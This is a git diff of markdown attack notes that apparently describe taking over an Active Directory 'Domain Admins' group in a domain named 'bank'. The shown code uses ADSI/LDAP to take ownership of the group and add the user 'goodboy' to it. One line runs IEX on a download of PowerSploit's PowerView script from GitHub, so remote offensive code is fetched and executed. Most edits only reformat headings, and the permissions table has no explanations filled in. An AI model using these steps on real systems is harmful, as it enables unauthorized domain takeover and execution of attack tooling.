@@ -42,6 +42,7 @@ $acl = Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=bank,DC=com"
 ```
 
 ## 1. Take ownership
+
 ```bash
 $group = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=local"
 
@@ -54,16 +55,16 @@ $group.psbase.CommitChanges()
 $group.Add("LDAP://CN=goodboy,CN=Users,DC=bank,DC=local")
 ```
 
-Key Explanations:
+# Key Explanations:
 
-Permission	Why Needed
-Modify owner	
-Modify permissions	
-Write properties	
+## Permission	Why Needed
+- Modify owner	
+- Modify permissions	
+- Write properties	
 
 
 ---------------------------------------------------------------------------------
-with ✔ Modify permissions
+### with ✔ Modify permissions
 
 IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
 
